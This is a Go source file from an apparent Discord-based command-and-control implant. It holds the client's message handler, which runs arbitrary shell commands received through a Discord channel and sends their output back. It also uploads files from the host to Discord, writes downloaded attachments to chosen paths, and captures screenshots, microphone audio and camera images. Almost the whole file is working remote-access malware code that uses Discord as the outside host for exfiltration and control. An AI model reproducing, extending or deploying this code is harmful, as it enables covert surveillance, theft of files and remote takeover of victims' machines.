package main

// This file contains the message handler used for emoji and text shortcuts,
// log streaming helpers, and the generic shell-command execution helper.

import (
	"discord-c2/actions"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"

	"github.com/bwmarrin/discordgo"
)

// discordLogWriter forwards log lines to Discord when log streaming is enabled,
// while still writing to an underlying io.Writer.
type discordLogWriter struct {
	base io.Writer
}

// Global state for streaming log lines into a specific Discord channel.
var (
	logStreamEnabled   bool
	logStreamSession   *discordgo.Session
	logStreamChannelID string
	logStreamMutex     sync.Mutex
)

// Write implements io.Writer, forwarding log lines to Discord when streaming
// is enabled and then delegating to the wrapped writer.
func (w *discordLogWriter) Write(p []byte) (int, error) {
	n, err := w.base.Write(p)
	msg := strings.TrimSpace(string(p))
	if msg == "" {
		return n, err
	}
	logStreamMutex.Lock()
	enabled := logStreamEnabled
	s := logStreamSession
	ch := logStreamChannelID
	logStreamMutex.Unlock()
	if enabled && s != nil && ch != "" {
		if len(msg) > 1800 {
			msg = msg[:1800]
		}
		content := "```log\n" + msg + "\n```"
		go s.ChannelMessageSend(ch, content)
	}
	return n, err
}

// enableLogStreaming directs future log lines to the given channel.
func enableLogStreaming(s *discordgo.Session, channelID string) {
	logStreamMutex.Lock()
	logStreamEnabled = true
	logStreamSession = s
	logStreamChannelID = channelID
	logStreamMutex.Unlock()
}

// disableLogStreaming stops forwarding log lines to Discord.
func disableLogStreaming() {
	logStreamMutex.Lock()
	logStreamEnabled = false
	logStreamSession = nil
	logStreamChannelID = ""
	logStreamMutex.Unlock()
}

// runCommandString executes a shell command on the client and streams its
// combined stdout/stderr output back to the channel in Discord-sized chunks.
func runCommandString(s *discordgo.Session, channelID string, ref *discordgo.MessageReference, cmdStr string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("C:\\Windows\\System32\\cmd.exe", "/c", cmdStr)
	} else {
		cmd = exec.Command("/bin/bash", "-c", cmdStr)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		out = append(out, 0x0a)
		out = append(out, []byte(err.Error())...)
	}

	outStr := string(out)
	if len(outStr) == 0 {
		s.ChannelMessageSendReply(channelID, "```bash\n<no output>\n```", ref)
	} else {
		runes := []rune(outStr)
		const maxChunk = 1800
		for start := 0; start < len(runes); start += maxChunk {
			end := start + maxChunk
			if end > len(runes) {
				end = len(runes)
			}
			chunk := string(runes[start:end])
			var resp strings.Builder
			resp.WriteString("```bash\n")
			resp.WriteString(chunk)
			resp.WriteString("\n```")
			if start == 0 && ref != nil {
				s.ChannelMessageSendReply(channelID, resp.String(), ref)
			} else {
				s.ChannelMessageSend(channelID, resp.String())
			}
		}
	}
}

// restartClient re-execs the current binary, using platform-specific
// mechanisms, and returns only if the restart fails.
func restartClient() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	if runtime.GOOS == "windows" {
		cmd := exec.Command(exe, os.Args[1:]...)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Stdin = os.Stdin
		err := cmd.Start()
		if err != nil {
			return err
		}
		os.Exit(0)
		return nil
	}
	return syscall.Exec(exe, os.Args, os.Environ())
}

// handler processes messages in the per-device channel, wiring emoji and text
// shortcuts to the same capabilities exposed via slash commands.
func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.ChannelID != myChannelId || m.Author.ID == s.State.User.ID {
		return
	}

	s.MessageReactionAdd(m.ChannelID, m.ID, "🕐")
	flag := 0

	if strings.HasPrefix(m.Content, "🏃‍♂️") {
		cmdStr := strings.TrimSpace(strings.TrimPrefix(m.Content, "🏃‍♂️"))
		if cmdStr == "" {
			s.ChannelMessageSendReply(m.ChannelID, "Usage: 🏃‍♂️ <command>", m.Reference())
			goto done
		}
		runCommandString(s, m.ChannelID, m.Reference(), cmdStr)
		flag = 1
	} else if m.Content == "help" {
		help := "**D‑C2 Quick Help**\n\n" +
			"Use these simple controls in this device channel:\n\n" +
			"**Screenshots**\n" +
			"Use `/screenshot` or click the Screenshot button to capture the screen.\n\n" +
			"**Quick info**\n" +
			"Buttons for `whoami`, `id`, `hostname` and IP info run suitable commands on this OS:\n" +
			"- Windows: whoami, hostname, ipconfig\n" +
			"- Linux/macOS: whoami, id, hostname, ip addr\n\n" +
			"**Files**\n" +
			"Use `/download` and `/upload` or the 👇/☝️ emoji commands for file transfer.\n\n" +
			"**More controls**\n" +
			"Advanced commands are available via slash commands (see `/help`).\n\n" +
			"Send `help` or `/help` anytime to show this help again."
		components := []discordgo.MessageComponent{
			discordgo.ActionsRow{
				Components: []discordgo.MessageComponent{
					discordgo.Button{
						CustomID: "d2c_screenshot",
						Label:    "Screenshot",
						Emoji:    discordgo.ComponentEmoji{Name: "📸"},
						Style:    discordgo.PrimaryButton,
					},
				},
			},
			discordgo.ActionsRow{
				Components: []discordgo.MessageComponent{
					discordgo.Button{
						CustomID: "d2c_q_whoami",
						Label:    "whoami",
						Emoji:    discordgo.ComponentEmoji{Name: "🙍"},
						Style:    discordgo.SecondaryButton,
					},
					discordgo.Button{
						CustomID: "d2c_q_id",
						Label:    "id",
						Emoji:    discordgo.ComponentEmoji{Name: "🆔"},
						Style:    discordgo.SecondaryButton,
					},
					discordgo.Button{
						CustomID: "d2c_q_hostname",
						Label:    "hostname",
						Emoji:    discordgo.ComponentEmoji{Name: "💻"},
						Style:    discordgo.SecondaryButton,
					},
					discordgo.Button{
						CustomID: "d2c_q_ip",
						Label:    "ip info",
						Emoji:    discordgo.ComponentEmoji{Name: "🌐"},
						Style:    discordgo.SecondaryButton,
					},
				},
			},
			discordgo.ActionsRow{
				Components: []discordgo.MessageComponent{
					discordgo.Button{
						CustomID: "d2c_q_cwd",
						Label:    "cwd",
						Emoji:    discordgo.ComponentEmoji{Name: "📂"},
						Style:    discordgo.SecondaryButton,
					},
				},
			},
		}
		s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
			Content:    help,
			Reference:  m.Reference(),
			Components: components,
		})
		flag = 1
	} else if m.Content == "📸" {
		log.Printf("SCREENSHOT emoji trigger: channel=%s", m.ChannelID)
		actions.Screenshot(s, m.ChannelID, m.Reference())
		flag = 1
	} else if m.Content == "🎙" {
		log.Printf("MIC emoji trigger: channel=%s user=%s", m.ChannelID, m.Author.ID)
		actions.MicRecord(s, m.ChannelID, m.Reference(), 10, "")
		flag = 1
	} else if m.Content == "📷" {
		log.Printf("CAMERA emoji trigger: channel=%s user=%s", m.ChannelID, m.Author.ID)
		actions.CameraSnapshot(s, m.ChannelID, m.Reference())
		flag = 1
	} else if strings.HasPrefix(m.Content, "👇") {
		parts := strings.Fields(m.Content)
		if len(parts) < 2 {
			s.ChannelMessageSendReply(m.ChannelID, "Usage: 👇 <path>", m.Reference())
			goto done
		}
		fileName := strings.TrimSpace(parts[1])
		if strings.HasPrefix(fileName, "~/") {
			if home, err := os.UserHomeDir(); err == nil {
				fileName = home + string(os.PathSeparator) + fileName[2:]
			}
		}
		f, err := os.Open(fileName)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Cannot open file: "+fileName+" ("+err.Error()+")", m.Reference())
		} else {
			defer f.Close()
			fi, err := f.Stat()
			if err != nil {
				s.ChannelMessageSendReply(m.ChannelID, "Cannot stat file: "+fileName+" ("+err.Error()+")", m.Reference())
			} else {
				if fi.Size() < 8388608 {
					fileStruct := &discordgo.File{Name: filepath.Base(fileName), Reader: f}
					fileArray := []*discordgo.File{fileStruct}
					_, err = s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
						Files:     fileArray,
						Reference: m.Reference(),
					})
					if err != nil {
						s.ChannelMessageSendReply(m.ChannelID, "Upload failed: "+err.Error(), m.Reference())
					} else {
						flag = 1
					}
				} else {
					s.ChannelMessageSendReply(m.ChannelID, "File is bigger than 8MB 😔", m.Reference())
				}
			}
		}
	} else if strings.HasPrefix(m.Content, "☝️") {
		parts := strings.Fields(m.Content)
		if len(parts) < 2 {
			s.ChannelMessageSendReply(m.ChannelID, "Usage: ☝️ <path> *attach", m.Reference())
			goto done
		}
		path := strings.TrimSpace(parts[1])
		if strings.HasPrefix(path, "~/") {
			if home, err := os.UserHomeDir(); err == nil {
				path = home + string(os.PathSeparator) + path[2:]
			}
		}
		if len(m.Attachments) > 0 {
			out, err := os.Create(path)
			if err != nil {
				s.ChannelMessageSendReply(m.ChannelID, "Cannot create file: "+path, m.Reference())
			} else {
				defer out.Close()
				resp, err := http.Get(m.Attachments[0].URL)
				if err != nil {
					s.ChannelMessageSendReply(m.ChannelID, "Download failed: "+err.Error(), m.Reference())
				} else {
					defer resp.Body.Close()
					_, _ = io.Copy(out, resp.Body)
					s.ChannelMessageSendReply(m.ChannelID, "Uploaded file to "+path, m.Reference())
					flag = 1
				}
			}
		}
	} else if m.Content == "🔁" {
		s.ChannelMessageSendReply(m.ChannelID, "🔁 Restarting client...", m.Reference())
		err := restartClient()
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, "Restart failed: "+err.Error(), m.Reference())
		}
	} else if m.Content == "💀" {
		flag = 2
	}

done:
	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")
	if flag > 0 {
		s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
		if flag > 1 {
			s.Close()
			os.Exit(0)
		}
	}
}
